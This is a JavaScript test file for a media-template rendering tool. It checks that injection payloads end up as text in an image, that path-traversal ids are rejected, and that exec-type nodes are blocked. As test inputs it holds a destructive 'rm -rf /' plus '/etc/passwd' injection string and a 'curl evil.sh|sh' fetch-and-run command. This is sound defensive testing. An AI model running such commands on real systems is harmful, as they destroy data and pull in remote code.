'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, assert, minimalTemplate, makeMemoryAssetStore, registerAuroraAssets, fixturesExist } = require('./helpers');
const { compileGraph } = require('../src/compiler');
const { prepareTextImages } = require('../src/text-render');
const { validateTemplate } = require('../src/render');
const { spawnFile } = require('../src/process');
const { assertSafeId, JsonStore } = require('../src/store');

// The system's threat model: editors supply JSON + media, never commands.
// These tests prove hostile strings cannot reach a shell or escape the data dir.

test('injection payload in text is written to an image, never to a shell or filter string',
  { skip: !fixturesExist() },
  async () => {
    const tpl = minimalTemplate();
    tpl.variables[0].maxLength = 500;
    tpl.nodes[2].params.y = 120;
    tpl.nodes[2].params.height = 500;
    tpl.nodes[2].params.fontSize = 36; // room so layout validation is not the thing under test
    const payload = '"; rm -rf / # $(touch pwned) `id` && cat /etc/passwd';
    const store = makeMemoryAssetStore();
    const bindings = await registerAuroraAssets(store);
    const validation = await validateTemplate(tpl, { title: payload }, bindings, store);
    assert.equal(validation.ok, true); // payload is legal *text*, just not a command

    const jobDir = fs.mkdtempSync(path.join(os.tmpdir(), 'adcomp-sec-'));
    const { images } = prepareTextImages(tpl, { title: payload }, jobDir);
    const graph = compileGraph(tpl, bindings, store, validation.measurements, jobDir, { textImages: images });

    // the payload must not appear anywhere in the filter graph or argv
    const flatArgs = graph.argv.join('\n');
    assert.equal(flatArgs.includes('rm -rf'), false);
    assert.equal(graph.filterGraph.includes('rm -rf'), false);
    assert.equal(graph.filterGraph.includes('/etc/passwd'), false);
    // it lives only inside the pre-rendered PNG layer
    assert.ok(fs.existsSync(images.titleLayer));
    assert.equal(fs.statSync(images.titleLayer).size > 0, true);
  });

test('path traversal ids are rejected by the store', () => {
  assert.throws(() => assertSafeId('../etc/passwd'), /unsafe or invalid id/);
  assert.throws(() => assertSafeId('a/b'), /unsafe or invalid id/);
  assert.throws(() => assertSafeId('..'), /unsafe or invalid id/);
});

test('store confines every artefact under its data root', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'adcomp-store-'));
  const store = new JsonStore(root);
  const jobDir = store.jobDir('job_abc123');
  assert.equal(jobDir.startsWith(path.resolve(root)), true);
  store.saveTemplate({ id: 'tpl_x', name: 'x' });
  const saved = store.getTemplate('tpl_x');
  assert.equal(saved.id, 'tpl_x');
  assert.throws(() => store.getTemplate('../../escape'));
});

test('spawnFile uses shell:false so argv metacharacters are literal', async () => {
  // echo is not used in production paths; this proves the spawn contract.
  const bin = process.execPath;
  const { stdout } = await spawnFile(bin, ['-e', 'console.log("ok")']);
  assert.equal(stdout.trim(), 'ok');
});

test('node type allow-list blocks command-shaped nodes even with shell payload in params', () => {
  const tpl = minimalTemplate();
  tpl.nodes.push({ id: 'evil', type: 'exec', inputs: ['bg'], params: { cmd: 'sh -c "curl evil.sh|sh"' } });
  const { validateTemplateShape } = require('../src/schema');
  const report = validateTemplateShape(tpl);
  assert.ok(report.errors.some((e) => e.code === 'NODE_TYPE_UNKNOWN' && e.nodeId === 'evil'));
});
